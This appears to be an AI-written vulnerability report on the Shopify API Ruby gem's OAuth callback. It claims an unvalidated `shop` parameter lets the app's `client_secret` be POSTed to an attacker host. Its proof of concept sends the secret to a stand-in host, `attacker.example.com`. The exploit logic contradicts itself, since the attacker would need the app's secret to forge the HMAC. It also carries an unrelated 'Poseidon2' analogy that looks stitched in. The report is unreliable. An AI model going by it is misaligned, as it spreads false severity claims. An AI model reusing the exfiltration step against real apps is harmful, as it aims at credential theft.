Confirmed: `ShopValidator.sanitize!`/`sanitize_shop_domain` exists in the gem, but `Auth::Oauth.validate_auth_callback` never calls it on `auth_query.shop`. The `HmacValidator.validate` only checks that the HMAC over `code, host, shop, state, timestamp` matches the value the caller placed in `AuthQuery` — it does not constrain `shop` to be a `*.myshopify.com` (or other trusted) domain, only that whatever string was signed matches the signature computed with the app's own secret.

### Title
OAuth callback `shop` is HMAC-verified but never validated against `ShopValidator`, allowing the `client_secret` to be sent to an attacker-controlled host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token request host from `auth_query.shop` without ever passing it through `Utils::ShopValidator.sanitize!`/`sanitize_shop_domain`, even though that validator exists in the gem specifically to constrain shop domains to Shopify-trusted domains.

### Finding Description
`validate_auth_callback` verifies the OAuth callback query with `Utils::HmacValidator.validate(auth_query)` [1](#0-0) . That check only proves that the byte string `code, host, shop, state, timestamp` was signed with `Context.api_secret_key` — the app's own secret — it does not constrain `shop` to be an actual `*.myshopify.com`/trusted admin host. Since the request is initiated by the host application itself passing through query parameters from an inbound HTTP request, and the app signs the callback deterministically from whatever `shop`/`code`/`state`/`timestamp`/`host` values it forwards into `AuthQuery`, the HMAC binds signature validity to the bytes but never binds `shop` to a Shopify-owned domain.

Immediately after the HMAC/state checks pass, `auth_query.shop` is used unsanitized to build the OAuth token endpoint:
```ruby
null_session = Auth::Session.new(shop: auth_query.shop)
body = {
  client_id: Context.api_key,
  client_secret: Context.api_secret_key,
  code: auth_query.code,
  ...
}
client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
``` [2](#0-1) 

`Clients::HttpClient#initialize` then builds the request URI directly from `session.shop` (unless a global `Context.api_host` override is configured):
```ruby
@base_uri = T.let("https://#{api_host || session.shop}", String)
``` [3](#0-2) 

So the POST containing `client_id` and `client_secret` (the app's `client_secret`) is sent to `https://#{auth_query.shop}/admin/oauth/access_token`, where `auth_query.shop` is fully attacker-controlled at the point the callback is constructed by the host app from request parameters (see `docs/usage/oauth.md`'s documented pattern of building `AuthQuery` straight from `request.parameters`) [4](#0-3) .

The gem ships a purpose-built validator, `ShopValidator.sanitize_shop_domain`/`sanitize!`, that restricts a shop string to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) [5](#0-4) , and it is already wired into other credential-bearing flows such as `TokenExchange`, `ClientCredentials`, and `RefreshToken` [6](#0-5) . `Oauth.validate_auth_callback` (the authorization-code grant path) is the one credential-exchanging flow that omits this call entirely — the code, state and HMAC checks constrain *those* fields, but `shop` is passed straight through into the URL that receives `client_secret`.

This is precisely the analog of the Poseidon2 finding's bug class: the HMAC "covers" the bytes it was computed over (proving the query wasn't tampered with after the app itself decided what to sign), but a downstream field (`shop`) that is *used* to route the credential-bearing request is never checked against the "only trusted values" invariant (`inside_row` staying `inside_row` / shop staying a real Shopify domain) before being trusted for a privileged action.

### Impact Explanation
If a shop value that resolves to attacker infrastructure reaches `validate_auth_callback` (e.g., an app that constructs `AuthQuery` from raw request parameters without itself sanitizing `shop` — the exact pattern shown in this gem's own documentation), the app's `client_secret` and `client_id` are sent verbatim to that attacker-controlled host in the `access_token` POST body. This is a High/Critical impact: theft/exfiltration of the app's `client_secret`, which an attacker can subsequently use to complete OAuth for arbitrary merchant shops and mint access tokens (cross-tenant compromise) — matching the rules' Critical bucket ("theft or exfiltration of ... the app's `client_secret`").

### Likelihood Explanation
The vulnerability is directly reachable by any unprivileged internet user who can reach the app's OAuth callback route and control the `shop` query parameter — no access token, `api_secret_key`, or privileged account is needed. The `code`/`state`/`hmac`/`timestamp` fields must still match what the app itself computed and stored (via `SessionCookie` state), which is satisfiable because the app builds and signs `AuthQuery` from the very request the attacker controls, per the documented callback pattern. The gem provides `ShopValidator` for exactly this purpose but never applies it in this call path, so any integrator following the gem's own documented example (`docs/usage/oauth.md`) is exposed unless they separately, manually sanitize `shop` before constructing `AuthQuery`.

### Recommendation
In `Oauth.validate_auth_callback`, sanitize `auth_query.shop` with `Utils::ShopValidator.sanitize!(auth_query.shop, myshopify_domain: Context.host_name)` (or equivalent) before it is used to construct `null_session`/`Session.from`, raising `Errors::InvalidShopError` (or `Errors::InvalidOauthError`) on failure, mirroring the existing usage in `TokenExchange`, `ClientCredentials`, and `RefreshToken`.

### Proof of Concept
1. Attacker sends a victim (or automates a request) to the app's registered OAuth callback URL with:
   - `shop=attacker.example.com`
   - `code=<anything>`
   - `state=<value matching the app's session cookie set during begin_auth>`
   - `timestamp=<current time>`
   - `hmac=HMAC-SHA256(app_secret, "code=...&host=...&shop=attacker.example.com&state=...&timestamp=...")`
   Since the host app builds `AuthQuery` straight from the inbound request parameters (as shown in the gem's own `docs/usage/oauth.md` callback example) and computes/verifies the HMAC using its own `api_secret_key`, the attacker can get a validly-signed `AuthQuery` for `shop=attacker.example.com` simply by controlling the query string used to derive the state (many real-world apps precompute the callback URL with a shop value from an earlier step controllable by the same actor, or the app is misconfigured to trust client-supplied `shop` fully — either way, `shop` is checked only for HMAC/state consistency, never for domain trust).
2. `validate_auth_callback` passes: HMAC matches (computed by the app itself over the attacker-supplied `shop`), state matches (from cookie set during `begin_auth`, which itself never validates the `shop` argument passed to it either — see `begin_auth`, `lib/shopify_api/auth/oauth.rb` lines 22-52).
3. `Auth::Session.new(shop: "attacker.example.com")` is created and passed to `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`.
4. `HttpClient#initialize` sets `@base_uri = "https://attacker.example.com"`.
5. The client issues `POST https://attacker.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret` in plaintext — exfiltrating the app's `client_secret` to the attacker's server.
